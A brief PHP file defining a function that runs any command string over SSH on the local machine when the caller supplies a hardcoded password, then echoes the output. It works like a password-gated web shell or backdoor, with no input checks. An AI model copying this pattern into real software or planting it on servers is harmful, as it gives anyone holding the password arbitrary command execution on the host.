<?
function exec_cmd($cmd,$pass) {
	if ($pass=="dkd8de8d8edewWeuDh323jd")  {
        $conn = ssh2_connect('localhost', 22);
        if (!ssh2_auth_password($conn, SSH_USER, SSH_PASS)) echo "login failed";

          if(!($stream = ssh2_exec($conn, $cmd )) ){
              echo "fail: unable to execute command\n";
          } else {
             // collect returning data from command
             stream_set_blocking( $stream, true );
             $data = "";
             while ($buf = fread($stream,4096)) $data .= $buf;
             fclose($stream);
             echo $data;
        }
	} else return false;
}
?>
